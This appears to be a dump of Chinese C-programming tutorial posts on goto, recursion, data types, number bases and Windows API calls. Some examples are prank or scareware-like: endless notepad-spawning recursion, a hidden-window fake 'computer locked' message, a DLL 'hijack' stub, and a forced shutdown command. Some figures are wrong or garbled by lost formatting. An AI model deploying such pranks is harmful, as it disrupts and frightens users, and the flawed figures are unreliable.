从C直接往下执行\nD:printf(&quot;DDD\\n&quot;);\nE:printf(&quot;EEE\\n&quot;);\nF:printf(&quot;FFF\\n&quot;);\n&#125;\n使用goto跳出复杂循环#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nvoidmain()&#123;\n\nfor(inti&#x3D;0;i&lt;10;i++)&#123;\nfor(intj&#x3D;0;j&lt;10;j++)&#123;\nif(i&#x3D;&#x3D;5)&#123;\n_&#x2F;&#x2F;break;&#x2F;&#x2F;跳出当前循环_\ngotoA;\n&#125;\nprintf(&quot;%3d%3d&quot;,i,j);\n&#125;\nprintf(&quot;\\n&quot;);\n&#125;\n\nA:system(&quot;pause&quot;);\n&#125;\n\n\n3.6.7 简单的递归#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid main() &#123;\n\n&#x2F;* 一个简单的递归(从前有座庙的无限循环) *&#x2F;\nsystem(&quot;notepad&quot;);\nmain();\nsystem(&quot;notepad&quot;);\n&#125;\n3.6.8 SetWindowPos 函数\n第一个参数：窗口句柄对象\n第二个参数：关于如何在Z轴上放置窗口标记，因为我们是二维所以默认为NULL\n第三个参数：窗口的x坐标\n第四个参数：窗口的y坐标\n第五个参数：窗口的x轴大小\n第六个参数：窗口的y轴坐标\n第七个参数：关于如何移动窗口的标记，默认为0\n\n3.6.9 捕获窗口 Windows系统函数HWND window &#x3D; FindWindowA(“窗口类名”, “窗口标题”);它会根据窗口的类型与标题寻找窗口，并将信息存储在我们创建的 HWND类型的window对象中。\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;Windows.h&gt;\n\nvoid open() &#123;\n &#x2F;&#x2F;ShellExecuteA(0, &quot;open&quot;, &quot;\\&quot;C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\\&quot;&quot;, 0, 0, 1);\n ShellExecuteA(0, &quot;open&quot;, &quot;notepad&quot;, 0, 0, 1);\n&#125;\n\n\n&#x2F;**\n*   我们可以借助黑客软件来扫描窗口信息例如：Spy.exe 或 ViewWizard\n*   HWND window 存储应用的窗口(Windows系统函数)\n*   FindWindowA(&quot;窗口类名类名&quot;,&quot;应用的窗口标题&quot;);\n* \n*   SetWindowPos Windows系统函数，用来设置窗口的大小和位置信息\n*   400 300 是设置窗口的位置 200 200 是设置窗口的大小\n*   \n*&#x2F;\nvoid show() &#123;\n HWND window &#x3D; FindWindowA(&quot;Notepad&quot;, &quot;无标题 - 记事本&quot;);\n if (window &#x3D;&#x3D; NULL) &#123;\n printf(&quot;应用窗口破获失败\\n&quot;);\n &#125;\n SetWindowPos(window, NULL, 400, 300, 200, 200, 0);\n\n &#x2F;* 窗口闪现 *&#x2F;\n int i &#x3D; 0;\nLOOP:while (i &lt; 500) &#123;\n SetWindowPos(window, NULL, 400, 300, i, i, 0);\n Sleep(1000);\n i +&#x3D; 50;\n &#125;\n while (i &gt; 500) &#123;\n SetWindowPos(window, NULL, 400, 300, i, i, 0);\n Sleep(1000);\n i -&#x3D; 50;\n &#125;\n int j &#x3D; 0;\n if (i &lt; 500 &amp;&amp; j &lt; 3) &#123;\n ++j;\n goto LOOP;\n &#125;\n&#125;\n\n&#x2F;* 关闭应用 *&#x2F;\nvoid close() &#123;\n system(&quot;taskkill &#x2F;f &#x2F;im Notepad.exe&quot;);\n&#125;\n \n\nvoid main() &#123;\n open();\n Sleep(5000);    &#x2F;&#x2F; 调试延迟，使用可以去掉\n show();\n Sleep(5000);\n close();\n system(&quot;pause&quot;);\n&#125;\n3.7.0 隐藏黑窗口隐藏程序执行时的黑色窗口。\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;Windows.h&gt;\n\n&#x2F;**\n* 隐藏黑窗口(伪装DOS窗口)：\n*        不动声色的执行程序\n*        隐藏在别的程序中执行\n* \n* #pragem 程序预编译\n* linker  链接\n* &quot;&#x2F;subsystem:\\&quot;windows\\&quot;&#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot; 以Windows模式下去编译默认情况下是DOS窗口模式(DOS指令模式)编译，这句话是让它以Windows模式进行编译\n* 项目属性- 链接器 - 系统 改变子系统为(窗口(&#x2F;SUBSYSTEM:WINDOWS))\n*&#x2F;\n\n#pragma comment(linker, &quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;) &#x2F;&#x2F; 隐藏DOS窗口\nvoid main() &#123;\n\nMessageBoxA(0, &quot;你的电脑已被锁定&quot;, &quot;系统提示&quot;, 0);\n\n&#x2F;&#x2F;system(&quot;pause&quot;);\n&#125;\n3.7.1 注射技术（将程序隐藏在另一个程序）注射技术在使用的时候需要注意，如果非法注射属于违法犯罪。我们学习注射技术是为了更好的保护自己的设备不被黑客注入。注射技术需要用到动态库 项目属性：常规 - 配置类型改为(默认是.exe) 动态库DLL设置属性的目标文件名：项目属性：常规 - 目标文件名 自定义名称动态库我们不需要MAIN函数动态库想要被外部执行就必须提供一个接口 _declspec (dllexport)_declspec 的前面时俩个\n步骤：\n第一步：把项目默认值中的配置类型改为dll动态库\n第二步：引入windows.h头文件\n第三步：加入关键字 _declspaec (dllexport)\n第四步：更改常规中的目标文件名\n第五步：生成dll文件\n\n代码演示：\n#include &lt;Windows.h&gt;\n\n&#x2F;**\n* 注射技术在使用的时候需要注意，如果非法注射属于违法犯罪。我们学习注射技术是为了更好的保护自己的设备不被黑客注入。\n*\n* 注射技术需要用到动态库 项目属性：常规 - 配置类型改为(默认是.exe) 动态库DLL\n* 设置属性的目标文件名：项目属性：常规 - 目标文件名 自定义名称\n*\n* 动态库我们不需要MAIN函数\n* 动态库想要被外部执行就必须提供一个接口 _declspec (dllexport)\n* 注意：\n* __declspec 的前面时俩个_\n*&#x2F;\n\n\n__declspec(dllexport) void Hanker() &#123;\nMessageBoxA(0, &quot;您的系统被劫持&quot;, &quot;系统提示&quot;, 0);\n&#125;\n","slug":"C_2022_3.6.01","date":"2022-03-05T18:38:00.000Z","categories_index":"程序","tags_index":"教学文档,C语言","author_index":"Arvin"},{"id":"0d7ac8f90504dc9054e249685d0f3bd4","title":"C语言基本语法（上）","content":"3.1 什么是变量变量是指其值可以变化的量。计算机中，指令代码、数据都存储与内存中。变量也需要存储在内存中。在计算机中，每个变量都被分配了一块内存空间，在这些空间里存储的就是变量的值。变量之所以可以变化，就是这个存储空间可以存储不同的数值。存储空间里的值变化，则变量对应的值也变化。同一时间，内存空间里只能保存一份值，新值冲掉原来的值，每个内存单元都有编号，这些是内存的地址。\n3.1.1 什么是常量与变量常量就是计算机内存里面不变的数据。变量就是计算机内存里需要并且经常改变的数据举例说明：变量就是租房子。因为会经常变动常量就是买房子。基本不会变\n3.1.2 变量的概念与命名规则\n变量名定义：定义：\n\n程序中用于标识常量、变量、函数的字符序列组成：只能由字母、数字、下划线组成，第一个字符必须是字母或下划线大小写有区别不能使用C语言的关键字举例说明：给变量起名，就好比开房\n\n变量的语法\n\n变量类型变量名；变量名 &#x3D; 值；简写：变量类型变量名 &#x3D; 值；\n\n变量名要有意义：\n\n首先要保证的就是这个变量的名字要有意义。什么叫意义？举例：学生，年龄，身高，姓名现阶段给变量起名字的时候都是以字母开头后面可以跟任意字母、数字、下划线。\n\n变量的使用规则\n\n先声明，后赋值，再使用。\n注意：\n起的变量名不要与C语言系统中的关键字重复。\n在C语言中，大小写是敏感的。\n最好给变量赋予初值。\n同一个变量名在同一函数夏不允许重复定义。\n变量的命名规范\nCamel 驼峰命名法：要求变量名首单词的首字母要小写，其余每个单词的首字母要大写。多用于给变量命名。\nPascal 帕斯卡命名法：要求每个单词首字母要大写，其余字母小写。多用于类或者方法命名。\n\n\n\n3.1.3 C语言中变量一定要初始化变量如果不初始化，可以编译成功，但是执行的时候，很可能报错。操作系统是如何管理内存的？每当一个应用程序打开时，操作系统会为其分配内存，内存有内存地址与内存单元，当应用程序初始化时，就会往内存单元里面写入数据，当操作系统回收的时候，并不清楚内存单元，所以存在大量的垃圾数据。如果变量不初始化，就会默认读取垃圾数据，有些数据会导致系统崩溃。VC++2010 的编译器可以感知变量没有初始化，调试的时候就会出错。所以变量使用之前，必须初始化。\n3.1.4 定义常量的两种方式定义常量PI的两种方式：\n\n#define N 10\nConst float N10;\n\n区别：第一种方式：是将N定义成一种符号，此时N只是10的别名，在编译期间用10去取代N的值，Define相当于替换。第二种方式：是将N定义称为变量，但是告诉编译器它的值是固定不变的，如果在程序中试图去修改它的值，在编译时会报错。#define 定义常量有什么好处\n\n通过有意义的单词符号，可以指明该常量的意思，使得程序员在阅读代码时，减少迷惑。\n需要修改常量的时候，可以只需要修改一次，实现批量修改，效率高而且准确。\n\n如中需要将PI修改成3.14的话，只需要更改代码行：#define N 10 为 #define N 11\n3.1.5 转义字符\n\n\n转义字符\n意义\nASCII码值（十进制）\n\n\n\n\\a\n响铃\n007\n\n\n\\b\n退格（BS），将当前位置移到前一列\n008\n\n\n\\f\n换页（BS），将当前位置移到下页开头\n012\n\n\n\\n\n换行（FF），将当前位置移到下行开头\n010\n\n\n\\r\n回车（CR），将当前位置移到本行开头\n013\n\n\n\\t\n水平制表符（HT），跳到下一个TAB位置\n009\n\n\n\\v\n垂直制表（VT）\n011\n\n\n\\\\\n代表一个反斜线字符”\\‘\n092\n\n\n\\&#96;\n代表一个单引号字符\n039\n\n\n\\“\n代表一个双引号字符\n034\n\n\n\\？\n代表一个问号\n063\n\n\n\\0\n空字符（NULL）\n000\n\n\n\\ddd\n1到3位八进制数所代表的任意字符\n三位八进制\n\n\n\\xhh\n1到2位十六进制所代表的任意字符\n二位十六进制\n\n\n3.2.1 二进制、八进制、十六进制转化成十进制方法：按权相加例1：(111011)2 &#x3D; 12^5+12^4+12^302^2+1^2^1+12^0&#x3D;59（10）例2：(136)8 &#x3D; 18^2+38^1+8^0&#x3D;94（10）例3：(1F2A)16 &#x3D; 116^3+1516^2+216^1+1016^0&#x3D;7978（10）演示：输出012 和0x12分别打印值，使用%d解析。结论1：0 开头代表八进制结论2：0x开头代表十六进制。一般用于地址注意：任何进制，不允许出现大于等于进制的数字\n3.2.2 二进制和八进制互相转换二进制转换成八进制：从右向左，每三位一组（不足三位左边补零），转换成八进制。八进制转换成二进制：用三位二进制数代替每一位八进制数\n\n\n\n000\n0\n\n\n\n001\n1\n\n\n010\n2\n\n\n011\n3\n\n\n100\n4\n\n\n101\n5\n\n\n110\n6\n\n\n111\n7\n\n\n例：(1101001)2 &#x3D; (001,101,001)2 &#x3D; (151)8例：(666)8 &#x3D; (110,110,110)2 &#x3D; (110110110)2\n3.2.3 二进制十六进制相互转换二进制转换成十六进制：从右向左，每四位一组（不足四位左补零），转换成十六进制十六进制转换成二进制：用四位二进制数代替每一位十六进制数\n\n\n\n0000\n0\n\n\n\n0001\n1\n\n\n0010\n2\n\n\n0011\n3\n\n\n0100\n4\n\n\n0101\n5\n\n\n0110\n6\n\n\n0111\n7\n\n\n1000\n8\n\n\n1001\n9\n\n\n1010\nA\n\n\n1011\nB\n\n\n1100\nC\n\n\n1101\nD\n\n\n1110\nE\n\n\n1111\nF\n\n\n例：(11010101111101)2 &#x3D; (0011,0101,0111,1101)2 &#x3D; (357D)16例：(4B9E)16 &#x3D; (0100,1011,1001,1110)2 &#x3D; (100101110011110)2\n3.2.4 十进制二进制转换十进制转换二进制\n\n十进制整数转换为二进制：方法是除以2取余，逆序排列，以(89)10为例，如下：\n\n89 &#x2F; 2 余144 &#x2F; 2 余022 &#x2F; 2 余011 &#x2F; 2 余15 &#x2F; 2 余12 &#x2F; 2 余01 余1(89) 10 &#x3D; (1011001)2(5) 10 &#x3D; (101)2(2) 10 &#x3D; (10)2\n3.2.5 二进制十进制转换十进制是逢十进一，由数字符号 0,1,2,3,4,5,6,7,8,9组成，可以这样分拆十进制数：(1234)10 &#x3D; 110^3+210^2+310^1+410^0 &#x3D; 1000 + 200 + 30 + 4 &#x3D; (1234)10采用同样的方式转换二进制到十进制：(1101)2 &#x3D; 12^3+12^2+02^1+12^0 &#x3D; 8 + 4 + 0 + 1 &#x3D;  (13)10(10.01)2 &#x3D; 12^1+02^0+02^-1+12^-2 &#x3D; 2 + 0 + 0 + 0.25 &#x3D; (2.25)10\n3.2.6 十进制小数转换二进制方法是乘以2取整，顺序排列，以(0.625)10为例：如下：0.6252 &#x3D; 1.25 取整10.252&#x3D;0.5 取整00.5*2&#x3D;1 取整1(0.625)10 &#x3D; (0.101)2(0.25)10 &#x3D; (0.01)2(0.5)10 &#x3D; (0.1)2\n3.2.7 计算机存储数据程序员编写的程序以及所使用的数据在计算机的内存中是以二进制位序列的方式存放的。典型的计算机内存段二进制位序如下：···0001000 101010101000101010111011001010010100100010010010010···上面的二进制位序里，每一位上的数字，要么是0，要么是1。在计算机中，位(bit)是含有0或者1值的一个单元。在物理上，它的值是一个负或者是一个正电荷。也就是计算机中可以通过电压的高低来表示一位所含有的值。如果是0，则用低电压表示，如果是1，则用高电压表示。在上面的二进制位序这个层次上，位的集合没有结构，很难来解释这些系列的意义。为了能够从整体上考虑这些位，于是给这些位序强加上结构的概念，这样的结构被称作为字节(byte)和字(word)。通常，一个字节由8位构成，而一个字由32位构成。或者说是4个字节构成。\n3.2.8 内存中的位，字节，字计算机中的内存是以位为最小存储单位的。通过对内存进行组织，可以引用特定的位集合。把计算机的内存起始位编号为1，每隔8位编号增1，也就是以字节为单位，每隔一个字节编号向上加一，可以对计算机所有内存进行编号。\n\n\n\n地址编号\n位7\n位6\n位5\n位4\n位3\n位2\n位1\n位0\n字节内容\n\n\n\n1\n1\n0\n0\n1\n0\n0\n0\n0\n10010000\n\n\n2\n0\n1\n1\n0\n0\n1\n1\n1\n01100111\n\n\n3\n1\n1\n1\n0\n1\n1\n0\n0\n11101100\n\n\n4\n0\n0\n0\n0\n0\n0\n0\n0\n00000000\n\n\n5\n0\n1\n1\n1\n0\n0\n1\n0\n01110010\n\n\n···\n\n\n\n\n\n\n\n\n\n\n\n3.2.8.1 计算机32位与64位的真正差别在于计算机的寻址能力什么是寻址能力？寻址能力一般指的是CPU对于内存寻址的能力，通俗来说，就是能用到的多少内存的应该问题，数据在存储器（RAM）中存放是有规律的，CPU在运算的时候需要把数据提取出来就需要知道数据存放在哪里，这个时候就需要挨家挨户的找，这就叫做寻址，但是如果地址太多了超出了CPU的能力范围，CPU就找不到了，CPU最大能查询多大范围的能力叫做寻址能力。CPU的寻址能力是以字节为单位的，如32位寻址的CPU可以寻址2^32次方大小的地址也就是4G，这也是为什么32位的CPU最大能搭配4G内存的原因，再多内存就找不到了。4G内存怎么得来的：2^32 &#x3D; 4G2^32 &#x3D; 2^22^102^102^10 &#x3D; 41024*1024*1024(KB) &#x3D; 4G32位内存代表的是内存最大地址为32位。一个16进制代表4个2进制。64位代表内存地址最大为64位。32位CPU支持最大内存为4G\n3.2.9 printf类型与数据类型声明变量的时候需要指明数据类型，声明函数的时候，也需要指明函数的返回值数据类型。数据类型是对程序所处理的数据的”抽象”，将计算机中可能出现的数据进行一个分类，哪些数据可以归结为一类，哪些数据又可以归结为另一类。比如整数1,2,3,-1,-2,0,1000归结为整数类型；带小数点的数据，比如：12.1,2343.34,-23434.33归结为实数类型。C语言规定，在程序中使用的每一个数据，必须指定其数据类型。在C语言中，提供了非常丰富的数据类型，如列出了C语言提供的所有类型：\n数据类型：简单类型：\n\n基础类型：\n整形（int）\n浮点（float\\double）\n字符型（char）\n空类型（void）\n\n\n用户定义类型：\n枚举类型（enum）\n\n\n\n结构类型：\n\n数组（[]）\n结构（struct）\n联合（union）\n类（class）\n\n指针类型：（*）注意：必须按照对应的数据类型去解析数据，不然会出错。Printf不会执行自动类型转换。\n输出字符表\n\n\n字符\n输出的数据类型\n含义\n\n\n\n%d\n整形\n整形输出\n\n\n%ld\n长整型\n长整型输出\n\n\n%o\n整数\n以八进制形式输出整数\n\n\n%x\n整数或字符串地址\n以十六进制数形式输出整数，或输出字符串地址\n\n\n%u\n输出unsigned型数据（无符号整形）\n以十进制输出unsigned型数据。注意：%d和%u有无符号的数值范围不一致，也就是极限值，不然会出错\n\n\n%c\n字符\n输出一个字符\n\n\n%s\n字符串\n输出一个字符串\n\n\n%f\n实数\n以小数形式输出，默认保留6位\n\n\n%.100\n实数\n保留小数点后100位\n\n\n%e\n实数\n以指数形式输出实数\n\n\n%g\n不输出0\n根据大小自动选f格式或e格式，且不输出无意义的0\n\n\n3.3.0 sizeof 运算符sizeof是一个单目运算符，用来计算操作数在内存中占据的字节数，其操作数既可以是括在圆括号中的类型标识符，其返回值是size_t类型，即无符号整数，如：\n\n\n\nSizeof(short)\n返回2\n\n\n\nSizeof(long)\n返回4\n\n\nSizeof(int)\n取决系统也可以是下面的表达式\n\n\nShort x；\n\n\n\n\n\n\n\nSizeof(x)\n返回2\n\n\n3.3.1 符号的作用整数的正负–有符号和无符号。前面论述的只关注了正整数，负数在计算机中该如何表示？正数和负数是两种情况，计算机又是一个很笨的东西，要区分两种情况，就必须有一个标记来表示是哪种情况。两种情况，用二进制的一位刚好可以表示，比如用0表示正数，用1表示负数，刚好可以区分清楚。那么一个4字节也就是32位存储单元的整数，应该用哪一位表示数据的正负符号呢？最简单的方法就是用最高位（就是最左边那一位）了。C语言中确实就是用最高位来表示应该整数的正负号。0表示为正，1表示为负。\n3.4.0 基本数据类型注意：数据的运算必须建立在数据的极限范围内。\n\n\n\n类型\n类型关键字\n长度(位)\n取值范围\n\n\n\n有符号字符型\n[signed]char\n8\n-127 — +127\n\n\n无符号字符型\nunsigned char\n8\n0 — 255\n\n\n有符号短整型\n[signed] short [int]\n16\n-32767 — +32767\n\n\n无符号短整型\nunsigned short [int]\n16\n0 —65535\n\n\n有符号长整型\n[signed] long [int]\n32\n-2147483647 — +2147483647\n\n\n无符号长整形\nunsigned long [int]\n32\n0 — 4294967295\n\n\n单精度实型\nfloat\n32\n约(3.410^-38 — 3.410^-38)\n\n\n双精度实型\ndouble\n64\n约(1.710^-308 — 1.710^-308)\n\n\n3.4.1 数值范围Int 型最大：2147483647Int 型最小：-2147483647unsingned int 型最大：0xffffffff 也就是 4294967295\n3.4.2 整型常量三种表示形式：\n\n十进制整数：由数字 0 - 9 和正负号表示。如：123，-456，0\n八进制整数：由数字 0 开头，后跟数字 0 - 7。如：0123，011\n十六进制整数：由 0x 或 0X 开头，后跟 0 - 9，a - f，A - F表示。如：0x123，0Xff\n长整形常量：789L，017L，0x12aL（用 l 或 L 引出）\n\n3.4.3 整型变量整型变量用于存放整型数据。根据数值的表示范围整形可以为整形（int）、短整型（short）、长整型（long）三种。这三种整型都默认为有符号型（signed）,有符号即可以是正数、负数和0。也可以根据需要，将整型指定为无符号型（unsigned），此时整型变量只能存放非负数。上面提到的 Short、long、signed、unsigned 都是一些类型修饰符，用于补充说明变量的特性。\n3.4.4 浮点型数据两种表示形式：\n\n十进制小数形式：必须带小数点。如：0.123，.123，123.0，0.0，123.\n指数形式：e或E之前必须有数字；指数必须为整数。如：12.3e3,123E2,1.23e4,e-5,1.2E-3.5\n\n在C语言中，则以”E”或”e”后跟一个整数来表示”10”为底数的幂数。（e代表10，3代表3次方）12.3e3 &#x3D;&#x3D; 12.3*10^3e代表基数10 3代表3次方\n1.2345e+002&#x3D;&#x3D;\ne+002表示10的2次方。科学计数法，用e表示10，加号表示正整数次方；减后，表示负整数次方，这里就是等于123.456实型常量的类型细分：\n\n默认为double型，例如3.14就是double类型。\n后面加f或F认为是Float型，例如：3.14f就是Float类型。\n\n%8.2f表示：整数8表示宽度为8，也就是8个字符，而.2表示精度为2，也就是小数点后有2位。\n3.4.5 浮点型变量浮点型分为单精度型（float）和双精度型（double）两种。Float 型数据占用4个字节（32bit）存储单元，提供的有效数字是6 - 7位。Double 型数据占用8个字节（64bit）存储单元，提供的有效数字是15 - 16位。\n3.4.6 字符型数据字符”1”和整数1是不同的概念：字符”1”只是代表一个形状为”1”的符号，在需要时按原样输出，在内存中以ASCII码形式存储，占1个字符。整数1是以整数存储方式（二进制补码方式）存储的，占2个或4个字节。注意：\n\n字符型常量和字符串常量长度不一致，sizeof(‘A’)和sizeof(“A”)；长度不一致，前者为4个字节，后者为2个字节。\n一个汉字占两个字节，只能由宽字符存储，字符串存储一个汉字输出是3个字节，因为字是两个加个”\\0”的一个字节。\nsizeof数据类型和sizeof字符型常量不是一个东西例如：\n\nChar a &#x3D; ‘A’；sizeof(ch)是一个字节，但sizeof(‘A’)是四个字节\n\nWchar_t wch &#x3D; “” 宽字符 可以存储汉字；’’是窄字符。\n\n3.4.7 字符型变量字符型变量在内存中占一个字节，由于存储的是字符的二进制ASCII码，与整型数据存储方式类似，字符型数据和整数数据可以相互运算。注意：字符串常量不允许赋值给字符型变量，C语言也没有专门的字符串变量。要在内存中存取字符串，只能使用数组或指针。设置默认控制台前景和背景颜色：COLOR [attr]   attr 指定控制台输出的颜色属性颜色属性由两个十六进制数学指定，第一个为背景，第二个则为前景。每个数字可以为以下如何值之一（在CMD输入Color ？也可查询）：\n\n\n\n0 &#x3D; 黑色\n8 &#x3D; 灰色\n\n\n\n1 &#x3D; 蓝色\n9 &#x3D; 淡蓝色\n\n\n2 &#x3D; 绿色\nA &#x3D; 淡绿色\n\n\n3 &#x3D; 浅绿色\nB &#x3D; 淡浅绿色\n\n\n4 &#x3D; 红色\nC &#x3D; 淡红色\n\n\n5 &#x3D; 紫色\nD &#x3D; 淡紫色\n\n\n6 &#x3D; 黄色\nE &#x3D;淡黄色\n\n\n7 &#x3D; 白色\nF &#x3D; 亮白色\n\n\n如果没有给定任何参数，该命令会将颜色还原到CMD.exe 启动时的颜色。这个值来自当前控制台窗口、&#x2F;T 命令行开关或 DefaultColor 注册表值。如果用相同的前景和背景颜色来执行 COLOR命令，COLOR命令会将ERRORLEVEL设置为1。例如：COLOR fc 在亮白色上产生亮红色\n3.4.8 ASCII码实际就是将我们所有字符都标号了。他们可以相互转换\n\n\n\nASCII值\n控制字符\nASCII值\n字符\nASCII值\n字符\nASCII值\n字符\n\n\n\n000\nNUL\n032\n(space)\n064\n@\n096\n&#96;\n\n\n001\nSOH\n033\n!\n065\nA\n097\na\n\n\n002\nSTX\n034\n“\n066\nB\n098\nb\n\n\n003\nETX\n035\n#\n067\nC\n099\nc\n\n\n004\nEOT\n036\n$\n068\nD\n100\nd\n\n\n005\nEND\n037\n%\n069\nE\n101\ne\n\n\n006\nACK\n038\n&amp;\n070\nF\n102\nf\n\n\n007\nBEL\n039\n‘\n071\nG\n103\ng\n\n\n008\nBS\n040\n(\n072\nH\n104\nh\n\n\n009\nHT\n041\n)\n073\nI\n105\ni\n\n\n010\nLF\n042\n*\n074\nJ\n106\nj\n\n\n011\nVT\n043\n+\n075\nK\n107\nk\n\n\n012\nFF\n044\n,\n076\nL\n108\nl\n\n\n013\nCR\n045\n-\n077\nM\n109\nm\n\n\n014\nSO\n046\n。\n078\nN\n110\nn\n\n\n015\nSI\n047\n&#x2F;\n079\nO\n111\no\n\n\n016\nDLE\n048\n0\n080\nP\n112\np\n\n\n017\nDC1\n049\n1\n081\nQ\n113\nq\n\n\n018\nDC2\n050\n2\n082\nR\n114\nr\n\n\n019\nDC3\n051\n3\n083\nS\n115\ns\n\n\n020\nDC4\n052\n4\n084\nT\n116\nt\n\n\n021\nNAK\n053\n5\n085\nU\n117\nu\n\n\n022\nSYN\n054\n6\n086\nV\n118\nv\n\n\n023\nETB\n055\n7\n087\nW\n119\nw\n\n\n024\nCAN\n056\n8\n088\nX\n120\nx\n\n\n025\nEM\n057\n9\n089\nY\n121\ny\n\n\n026\nSUB\n058\n:\n090\nZ\n122\nz\n\n\n027\nESC\n059\n;\n091\n[\n123\n{\n\n\n028\nFS\n060\n&lt;\n092\n\\\n124\n&#124;\n\n\n029\nGS\n061\n&#x3D;\n093\n]\n125\n}\n\n\n030\nRS\n062\n&gt;\n094\n^\n126\n~\n\n\n031\nUS\n063\n?\n095\n_\n127\n▢\n\n\n3.4.9 隐式类型转换（小转大）整型、实型、字符型数据之间可以混合运算。例如：10 + ‘a’ + 1.5 - 8765.1234*’b’不同数据类型之间运算会进行自动类型转换，规则如下：转换步骤：简单而言就是小的转大的。INT -&gt; unsigned -&gt; long -&gt; double。运算过程：\n\n进行 10 + ‘a’ 的运算：将’a’转换成整数97，得到和为107.\n进行 107+1.5 的运算：将107转换成 double 型，得到和为 108.500000.\n进行 8765.1234*’b’的运算：将’b’转换为double型数 98.000000，再和8765.1234相乘。\n把之前得到的108.500000减去8765.1234*’b’的值，就完成了整个表达式的求值。\n\n3.4.10 强制类型转换（大转小）一般形式：（类型名）（表达式）例如：（int）（x+y）（int）x+y（double）（3&#x2F;2）（int）3.6​\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nvoidmain()&#123;\n\n_&#x2F;*第一种*&#x2F;_\ndoublea&#x3D;3.1415926;\nprintf(&quot;%f\\n&quot;,a);\nprintf(&quot;%d\\n&quot;,(int)a);_&#x2F;&#x2F;强制类型转换，Printf不会自动执行类型转换_\n\n_&#x2F;*第二种(最常用)*&#x2F;_\ndoubleb&#x3D;3.1415926;\nintc&#x3D;b;_&#x2F;&#x2F;b是8个字节c是4个字节。当你声明一个变量的时候，变量的空间就已经决定了15_\nprintf(&quot;%f\\n%d\\n&quot;,b,c);\n\nfloatd&#x3D;3.1415f;\ndoublee&#x3D;d;\nprintf(&quot;%f\\n%f\\n&quot;,d,e);\nprintf(&quot;%f\\n&quot;,(float)e);\n\n_&#x2F;*char转int*&#x2F;_\ncharf&#x3D;&#39;a&#39;;\nprintf(&quot;%d\\n&quot;,(int)f);_&#x2F;&#x2F;把字符转换成ASCII码进行运算_\nintg&#x3D;71;\ncharG&#x3D;g;\nprintf(&quot;%d\\n%c\\n&quot;,sizeof(G),G);_&#x2F;&#x2F;int转char_\ninth&#x3D;g-1;\ncharH&#x3D;h;\nprintf(&quot;%c\\n&quot;,H);_&#x2F;&#x2F;我们可以通过修改ASCII的值来改变符号_\n\nsystem(&quot;pause&quot;);\n\n&#125;\n强制转换得到所需类型的中间变量，原变量类型、变量值保持不变。注意：\n\n当赋值给一个已经声明的类型的时候会发生类型转换。\nChar类型转变其它类型是ASCII码的相加或相减。\n\n精度损失问题：较高类型向较低类型转换时可能发生精度损失。类型间转换：不同类型的整型数据所占的字节数不同，他们在相互转换时需要格外小心，不要把过大的数据放在过小的数据类型中，在把占字节较大的数据赋值给占字节较小的数据时，防止出现以下的情况：\nint a &#x3D; 2147483648；\nprintf（&quot;%d&quot;,a）;\n这样赋值后，输出变量a的值并非预期的 2147483648，而是 -2147483648，原因是2147483648超出了int类型能装载的最大值，数据产生了溢出。如果换一种输出格式控制符，代码如下所示：\nprintf(&quot;%u&quot;,a);\n输出的结果就是变量a的值，原因是%u是按照无符号整型输出的数据，而无符号整型的数据范围上限大于2147483648这个值。\n","slug":"C_2022_3.2.01","date":"2022-03-02T10:44:00.000Z","categories_index":"程序","tags_index":"教学文档,C语言","author_index":"Arvin"},{"id":"b145a25a172abc434996c94993756fbb","title":"C语言特性","content":"2.0 C语言开发环境搭建\nVisual studio（全宇宙最强IDE）\n\n记得勾选C++就可以\n2.1 C语言常用命令Dir：列出当前目录下的文件以及文件卷md：创建目录rd ：删除目录cd：进入指定目录cd..：退回上一级目录cd&#x2F;：退回根目录del：删除文件exit：退出DOScl：编译和链接注意要点：\n\n使用Visual studio自带编译器执行\n不在同一盘符内不可执行需要进入到程序所在盘符（不用CD）\n进入盘符之后需要CD进入文件卷，进入文件卷之后再CI编译和链接\n注意指令间的空格\n\n2.1.1 练习：使用命令行生成一个关机程序#include &lt;stdlib.h&gt;\nvoid main () &#123;\nsystem(&quot;shutdown -s -t 600&quot;);\n&#125;\n编译：cl .c生成取消程序Main函数是主要程序，项目中必须有，仅只允许有一个，它是一个程序的入口。\n2.2.1 system(“pause”)和getchar()的区别相同点：两者都是让程序暂停区别：\n\ngetchar(); 读取一个字符\nSystem(“pause”)；既让操作系统来暂停该程序的执行，同时程序运行到此语句时，会让程序的窗口上显示”Press any key to continue…” 也就是”按任意键继续“，即等待的用户按下任意键使得该程序从暂停状态返回到执行状态继续从刚才暂停的地方开始执行。\n\n2.3.1  #include 说明Include 包含我们需要的函数定义。windows系统预制了很多库函数，我们需要采用就需要用#include去调用这些。源代码最终是需要被编译器处理的。编译器编译的过程比较复杂，但一般需要经历好几步。第一步是预处理。所谓预处理，就是编译前，先进行些预先的处理，如代替源代码中需要代替的部分。#include 就是这么一个预处理指示指令。\n#include 是C语言预处理器标识符。#和include之间可以有多个空格。#也不一定要顶格，但是一定是第一个非空白字符。#include的作用，是告诉编译器在编译前，要做一些预先处理：将后面&lt;&gt;中的文件内容包含到当前文件内，所谓包含，是指将&lt;&gt;中列出的文件的内容复制到当前文件里。\n注意：#一定要是第一个非空白字符。否则编译器会提示错误，并且错误信息和出错原因完全不匹配。因为getchar 和 printf 两个函数的声明位于 Stdio.h 文件中，所以简单的用#include把stdio.h文件包含进来，自然就把1getchar 和 printf 两个函数的声明包含进来了。说明：函数声明只是向编译器登记有这么一个函数，声明了函数不调用这个函数，是被允许的。这也就是为什么包含了整个stdio.h文件，里面声明了很多其他函数，但实际没有使用这些函数而编译器又不提示的原因。\n2.4.1 BUG的意思Bug的英文意思是臭虫，被引入到计算机领域，需要追溯到第一代计算机时代。当时的计算机是由许多真空管构成，需要利用大量的电力使真空管发光。某天，一只虫子爬进了其中的某只真空管中，计算机于是停止工作了。研究人员耗费了很长时间，找来找去，一处地方一处地方排查，终于发现这个虫子，取出虫子后，计算机就恢复了正常，于是BUG这个词语就在计算机领域中代表了隐藏的错误、缺陷、漏洞或者问题。把排除错误的过程称为DeBug。\n2.4.2 